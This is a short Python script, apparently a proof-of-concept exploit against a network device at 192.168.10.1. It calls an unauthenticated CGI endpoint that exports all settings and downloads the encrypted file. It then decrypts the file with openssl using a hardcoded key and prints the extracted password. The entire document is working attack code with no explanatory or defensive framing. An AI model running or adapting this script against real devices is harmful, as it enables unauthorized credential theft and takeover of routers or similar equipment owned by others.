import requests
import re
import os


#trigger the export
r = requests.get("http://192.168.10.1/cgi-bin/ExportAllSettings.sh")
m = re.search(r'url=(.+)"', r.text)

if(not m):
    raise "no url found"

r = requests.get(f"http://192.168.10.1/{m.groups()[0]}")

with open("settings.enc", "wb") as fout:
    #.content because we want the raw bytes, not the string version
    fout.write(r.content)


os.system("openssl aes-256-cbc -d -k 803f5d < settings.enc > settings.txt")

with open("settings.txt", "r") as f:
    data = f.read()
    m = re.search("Password=(.+)", data)
    print(m.groups()[0])
    
